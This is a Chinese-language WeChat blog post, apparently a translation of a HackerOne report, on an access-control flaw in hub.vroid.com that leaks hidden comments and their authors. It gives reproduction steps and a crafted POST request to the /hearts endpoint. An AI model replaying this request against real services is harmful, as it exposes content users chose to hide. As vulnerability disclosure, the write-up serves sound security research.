---
title: 越权所导致的信息泄露
url: https://mp.weixin.qq.com/s/Jo4b858lgaCYqp2nlJkDtQ
source: Doonsec's feed
date: 2026-02-16
fetch_date: 2026-02-17T04:19:35.929987
---

# 越权所导致的信息泄露

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/7xtecWUgCRydvGH8R1Ao7IxPCrNvSLb5x5hDvjIQ7MMejKzQoV0no1ISgk6AnbmtSrTt8ezOyvBRj65AwxibickLMpiaxWlWawLv8aCmIuZpd0/0?wx_fmt=jpeg)

# 越权所导致的信息泄露

原创

h1
h1

迪哥讲事

![]()

在小说阅读器中沉浸阅读

## 正文

在 https://accounts.pixiv.net/ 上注册两个任意账号。

使用这两个账号分别登录 https://hub.vroid.com。

以受害者用户（UserVictim）身份操作：进入「提交角色」页面并提交一个角色，向下滚动后会看到：

（图 1）

「在此处上传媒体并允许评论」的区域

![](https://mmbiz.qpic.cn/mmbiz_png/7xtecWUgCRyP7TeoNib4RO1a2pBZwdl63pNpEzKlJCgvUNUtLrkhGZ5FM58EMxGAZH4LozicTPpTbUrbvdFu3iayHSBRTGIMlMp9GiaXGGmDSbE/640?wx_fmt=png&from=appmsg)

* 发布任意一条测试评论，然后在受害者用户（UserVictim）的媒体设置中关闭评论功能。
* （此步骤仅用于测试，真实攻击中无需执行）以受害者用户（UserVictim）身份获取评论 ID（后续会用到）：按下 `Ctrl + U` 查看页面源代码，再按 `Ctrl + F` 搜索关键词 `entityIds`。

  （图 2）

![](https://mmbiz.qpic.cn/mmbiz_png/7xtecWUgCRyguhyhutYzE4svScNMj2UBvxhHw5AhVwqmksV4z4LcLu5xR5PBaec3ZuhDB8vdFibVDDW3HSwzNFJic9ceutcQjsgfJw3EHUaNQ/640?wx_fmt=png&from=appmsg)

* 保存找到的评论 ID 备用。
* 以攻击者用户（UserAttacker）身份操作：拦截任何发往 https://hub.vroid.com/ 的 POST 请求，并将其发送到重发器（Repeater）。
* 将该 POST 请求的 URL 和参数修改为如下内容

```
POST /api/statuses/PASTE_ID_HERE/hearts HTTP/2
Host: hub.vroid.com
Cookie: 攻击者的Cookie
Sec-Ch-Ua: "Opera";v="109", "Not:A-Brand";v="8", "Chromium";v="123"
Accept: application/json, text/plain, */*
Content-Type: application/json
X-Api-Version: 11
Sec-Ch-Ua-Mobile: ?0
Content-Length: 2

{}
```

发送修改后的请求，你会在响应内容中看到被隐藏的评论原文及其发布者信息。通过这种方式，攻击者可以泄露任何已被隐藏的评论。

![](https://mmbiz.qpic.cn/mmbiz_png/7xtecWUgCRxOZvmmlvywribxldicVDxgdcD5koHujER3kYUTAIUAm26oJmWrZECj0ppKI3FLdZLuJUFZ5hOrpvhHk5ia1D6RcsckLKGfaPVEZs/640?wx_fmt=png&from=appmsg)

评论:

受害者主动关闭评论功能，是为了让已发布的评论 “不可见”，但漏洞导致这些内容被强制泄露，剥夺了用户对自身内容的管理权限

一个中危漏洞,但是在国内目测这个漏洞只给200

要春节了,搞了个半折优惠券给大家

![](https://mmbiz.qpic.cn/mmbiz_png/7xtecWUgCRxyu0pUKG39Kvia5sNSiblk7PzRDMBEMaAUrosMAIQX5frZ4UibAwHwynTHw4Ky3DZceC5XfBwrTRC4Ty2Qw3Oaw6GeyiayNZMky9k/640?wx_fmt=png&from=appmsg)

## 参考

https://hackerone.com/reports/2541962

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过